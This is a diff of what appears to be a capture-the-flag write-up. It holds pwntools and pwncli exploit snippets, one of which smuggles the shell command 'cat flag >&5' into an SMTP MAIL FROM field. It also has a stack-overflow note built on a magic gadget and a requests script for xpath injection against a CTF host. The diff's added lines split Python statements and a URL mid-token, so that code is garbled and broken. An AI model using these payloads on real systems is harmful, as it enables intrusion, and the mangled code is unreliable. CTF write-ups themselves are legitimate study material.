@@ -171,7 +171,8 @@ p = remote(‘127.0.0.1’,9999)
 
 p.sendafter(‘220 SMTP tsmtpn’,’HELOfxxk’)
 
-p.sendafter(‘250 Okn’,”MAIL FROM:cat flag >&5×00″)
+p.sendafter(‘250 Okn’,”MAIL FROM:
+cat flag >&5×00″)
 
 p.sendafter(“250 Okn”,b”RCPT TO:” + flat({
 
@@ -203,7 +204,8 @@ p.close()
 
 note：
 
-菜单的逻辑，但是是栈溢出。利用 magic_gadget:add [rbp-3Dh],ebx 即可。
+菜单的逻辑，但是是栈溢出。利用 magic_gadget:
+add [rbp-3Dh],ebx 即可。
 
 #!/usr/bin/env python3
 
@@ -211,11 +213,14 @@ from pwncli import *
 
 cli_script()
 
-io:tube = gift[“io”]
+io:
+tube = gift[“io”]
 
-elf:ELF = gift[“elf”]
+elf:
+ELF = gift[“elf”]
 
-libc:ELF = gift.libc
+libc:
+ELF = gift.libc
 
 filename = gift.filename # current filename
 
@@ -621,7 +626,8 @@ xpath注入
 
 import requests
 
-url = ‘http://eci-2zeck6h5lu4hlf0o62vg.cloudeci1.ichunqiu.com:8888/hello’
+url = ‘http://eci-2zeck6h5lu4hlf0o62vg.cloudeci1.ichunqiu.com:
+8888/hello’
 
 head = {
 
